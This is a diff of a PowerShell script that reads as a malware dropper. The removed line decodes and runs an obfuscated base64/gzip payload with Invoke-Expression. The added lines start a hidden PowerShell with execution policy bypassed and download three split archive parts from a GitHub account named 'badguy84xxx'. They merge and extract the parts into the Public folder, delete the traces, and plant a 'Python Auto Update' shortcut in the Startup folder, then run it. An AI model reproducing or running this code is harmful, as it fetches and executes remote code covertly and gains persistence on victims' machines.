@@ -1,1 +1,93 @@
-$compressed = 'H4sIAAAAAAAA/6xWbW/bNhD+LkD/4aYaqI1FcvqyYnBhYKmTtB3aJIhTBGhTDLR4srlQpEBSid01/30gqfckWAf0i5GIvOeOzz33kuYUpiloQ5SBac4ERBEU8haV3iDnEB+odZmjMB+YNhDFl0xQebs0O47wjlGKAuKjLaalYVKcSc7SHbzZFURriBcyz4mgURg8gUPMmED4dP5BAxEUqLwVXBIKBTEbHQajUnENc/hjHAYAANHGmELPptM1M5tylaQyn64IXZe7319ut9vpiqTXU0VupwozPd0goXqaEyamb0h6XRbJN1Yk+/vPor2fCff858K9iMJgEgajolxxlh4yBXOIRihuZmfuSxQGI1maojT+7E/JRHxGzAb8b8cwXmwYp+5rdLYzGymscU0y0mPG0dM7aUDttx9HbSOPwsBmdKGQGASK2jBBbPqBMoWpkWoHLANmgErU4qkB3DJtwoBlMP5lfIHa9Pw1T5xM4B/P7wnexu8N5uB+L3YFwmGDPTSD+FiqFOE7nJYmPik5D4M7H+NhrTLCOWSWgzDIpEKSbmBsJQdMgJNe4/oJHG2NIqlx90GQHCFTMrfS9TdG9uDEfp/Dl+VOG8yT96eJjerrbPYWHbH23HmYdIxc4D/KeOPGPsVH1jzHHlW4t7hacIbCwNzRdrr6G1MDVVwnaJLL+sbQInmHhKLSyQGl4+iTRhUfrFGYaA+ij/Ib45xMf0v2YeyLXsPJBTzbT/ZfwyUTr16+hu2rl5OoeqBRu5rCgZc6akuLo2SvZWPSWlwqZjA+dVmF6LCRLugyTVHrrOR8N2tNo46zodB/nXcIfwLnmErV9hzsEngHKTHppht7P5IjpaRqbJlYz5xiov+4j4Ywrmcw+qtzM5XCMFHWrhudfkS1RrANa8/+Pne/L7xigQkjoS2/MOhQ/RZNvJDC2Px7MY3vkfEdllKZShgTiI9EKu074M3OIMTnSOhClsLAPnxvQ13eQ+62jT6It+rT4H3n9mH3UtgCRWEwSMCDZJbKunIF6RA7tOKWmYbHunQ/vz+rUmx7ziMdx/pvyn4g3wNKY9d24gOtMV/xnSv4ttoXMi8Uas2kSCyQP2kBvjx89TMr7O2vs1kV6oVsGtu4E9dety0+qjQPYTtvKvOCo0HaYxeM7OBEdSOpmglag4aq3lRGO5eV0e39c8zlDVZN+b4cXAd+tJadJ9q4GiqgtWt7swvJNueBmifdLD0SWPZQSI+HZV9ax5X5iGqDu//XI7xMsUlLR6a21gG5xod13mRBSAOZLAUFqbzWISOMDxIbNYqvpvByI5VJS2urwC8Ayc3K9g5Y2tWuLCCTnKIKg9EFUWusp3+0mF3Zzq+v/M5x5Y2vWgy7SNTw1dSrVgw4KI2ETwUlBhMurt1N7+3YOXP7zPjLkbhhSgq7RVYD0p3aZI2fVgZPJ5Ouo8cmZR++Oy27IVpqOgXdsHS5TBUrTLJ0q610DbEaiv5Tb4Ta/bX6s2fYzuMB+Q1UlYt5BZv4e/X3ce+Vk4FV4tNTEdBJ1vDepVTXTKzbvWgO42XBWb/Vtfb3HC3JDdp1sKvHd9Ju+c0LUhc4BWKgF3TUcuCX/yEJLk/xmZK27UN8XM/iHspDhdC4Ro9rdT/w/AMDw8Vta1GqCsj+U+NUZXkXBv8GAAD//+DRbqv+DAAA'; $bytes = [System.Convert]::FromBase64String($compressed); $stream = New-Object IO.MemoryStream(, $bytes); $decompressed = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader($decompressed); $obfuscated = $reader.ReadToEnd(); Invoke-Expression $obfuscated
+cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
+# Define URLs and download paths
+$urls = @(
+    "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.001",
+    "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.002",
+    "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.003"
+)
+$publicDir = "$env:Public"
+$outputDir = Join-Path -Path $publicDir -ChildPath "Python"
+$downloadedFiles = @()
+$outputFile = Join-Path -Path $publicDir -ChildPath "Backup.zip"
+
+# Create destination directory if it doesn't exist
+if (!(Test-Path -Path $outputDir)) {
+    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
+}
+
+# Download all files
+foreach ($url in $urls) {
+    # Extract file name from URL
+    $fileName = [System.IO.Path]::GetFileName($url)
+    $filePath = Join-Path -Path $publicDir -ChildPath $fileName
+
+    # Download file
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+    try {
+        $webClient.DownloadFile($url, $filePath)
+        Write-Output "Downloaded successfully: $filePath"
+        $downloadedFiles += $filePath # Record downloaded file
+    } catch {
+        Write-Output "Error downloading: $url"
+        Write-Output "Error details: $_"
+        continue
+    }
+}
+
+# Merge .001, .002, .003 files into Backup.zip
+try {
+    Get-Content -Path ($downloadedFiles | Sort-Object) -Encoding Byte -ReadCount 0 |
+        Set-Content -Path $outputFile -Encoding Byte
+    Write-Output "Files merged successfully: $outputFile"
+} catch {
+    Write-Output "Error during file merge: $_"
+    exit
+}
+
+# Extract ZIP file
+if (Test-Path -Path $outputFile) {
+    try {
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($outputFile, $outputDir)
+        Write-Output "Extraction completed: $outputFile to $outputDir"
+
+        # Delete ZIP file and downloaded parts
+        Remove-Item -Path $outputFile -Force
+        Write-Output "Deleted ZIP file: $outputFile"
+
+        foreach ($file in $downloadedFiles) {
+            Remove-Item -Path $file -Force
+            Write-Output "Deleted part file: $file"
+        }
+    } catch {
+        Write-Output "Error during extraction: $_"
+    }
+} else {
+    Write-Output "ZIP file not found or merge failed: $outputFile"
+}
+
+# Create Shortcut for Python.vbs in Startup folder
+$TargetFile = "C:\Users\Public\Python\Python.vbs"
+$ShortcutName = "Python Auto Update.lnk"
+$StartupFolder = "$([Environment]::GetFolderPath('Startup'))"
+$ShortcutPath = Join-Path -Path $StartupFolder -ChildPath $ShortcutName
+
+try {
+    # Create WScript.Shell object
+    $Shell = New-Object -ComObject WScript.Shell
+
+    # Create Shortcut
+    $Shortcut = $Shell.CreateShortcut($ShortcutPath)
+    $Shortcut.TargetPath = $TargetFile
+    $Shortcut.WorkingDirectory = (Split-Path -Path $TargetFile)
+    $Shortcut.Save()
+
+    Write-Host "Shortcut created at $ShortcutPath"
+
+    # Execute Shortcut
+    Start-Process -FilePath $ShortcutPath
+    Write-Output "Shortcut executed: $ShortcutPath"
+} catch {
+    Write-Output "Error creating or executing Shortcut: $_"
+}
